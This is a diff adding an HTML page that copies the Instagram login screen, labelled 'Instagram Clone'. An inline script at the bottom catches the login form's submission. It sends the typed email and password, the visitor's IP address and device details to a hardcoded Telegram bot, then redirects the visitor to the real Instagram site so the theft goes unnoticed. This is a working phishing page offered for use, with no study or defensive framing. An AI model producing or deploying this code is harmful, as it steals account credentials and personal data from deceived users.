@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram Clone</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form id="login-form">
+                    <label for="email" class="sr-only">Phone, username, or email</label>
+                    <input id="email" name="email" placeholder="Phone, username, or email" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input id="password" name="password" type="password" placeholder="Password" />
+
+                    <button type="submit">Log in</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png" alt="Image with the Apple Store logo" title="Image with the Apple Store logo" />
+                    <img src="./img/googleplay-button.png" alt="Image with the Google Play logo" title="Image with the Google Play logo" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CAREERS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">RELEVANT ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <p class="copyright">© 2020 Instagram from Facebook</p>
+    </footer>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        // Define basic variables
+        const TOKEN = "8123456064:AAFolzYClH95pYSxlfcTa0cQ1GCd8T0CDhk";  // Replace with your bot token
+        const CHAT_ID = "6610795561";  // Replace with your chat ID
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // Ensure elements exist on the page
+        document.addEventListener('DOMContentLoaded', function () {
+            const loginForm = document.getElementById('login-form');
+
+            if (loginForm) {
+                loginForm.addEventListener('submit', handleSubmit);
+            }
+        });
+
+        // Handle form submission
+        async function handleSubmit(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email')?.value || '';
+            const password = document.getElementById('password')?.value || '';
+
+            try {
+                // Fetch IP address
+                const ipResponse = await axios.get('https://api.ipify.org?format=json');
+                const ip = ipResponse.data.ip;
+
+                // Collect device information
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    deviceType: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+                };
+
+                // Format the message
+                const message = `
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceInfo.deviceType}\n
+                    <b>Platform:</b> ${deviceInfo.platform}\n
+                    <b>User Agent:</b> ${deviceInfo.userAgent}\n
+                    <b>Screen Resolution:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+                `.trim();
+
+                // Send data to Telegram
+                await axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                });
+
+                // Redirect the user
+                window.location.href = 'https://www.instagram.com';
+
+            } catch (error) {
+                console.error('Error:', error);
+                // Handle error differently if needed
+                window.location.href = 'https://www.instagram.com';
+            }
+        }
+    </script>
+</body>
+</html>
